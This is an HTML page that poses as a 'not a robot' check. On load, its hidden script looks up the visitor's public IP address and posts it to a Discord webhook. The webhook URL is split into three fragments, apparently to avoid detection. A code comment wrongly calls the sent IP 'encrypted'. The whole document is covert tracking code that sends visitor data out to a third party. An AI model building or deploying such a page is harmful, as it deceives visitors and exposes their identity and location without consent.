<!DOCTYPE html>
<html>
  <head>
    <title>IP Address</title>
  </head>
  <body>
    <h1>Please reload the page so I know you are not a robot.</h1>

    <script>
      // Get the visitor's IP address
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          // Display the visitor's IP address
          

          // Send the encrypted IP address to the Discord webhook
          const webhookUrl = "https://ptb.discord.c"
          const webhookUrl2 = "om/api/webhooks/1059330757362987048/TwVDe4r4OZ6d9ieHy7xT" 
          const webhookUrl3 = "etcvFL-9eCK4yBaiV3scifySO5OtnUU50NI6mrBTNnrAM4_1"
          fetch(webhookUrl+webhookUrl2+webhookUrl3, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: data.ip
            })
          });
        });
    </script>
  </body>
</html>
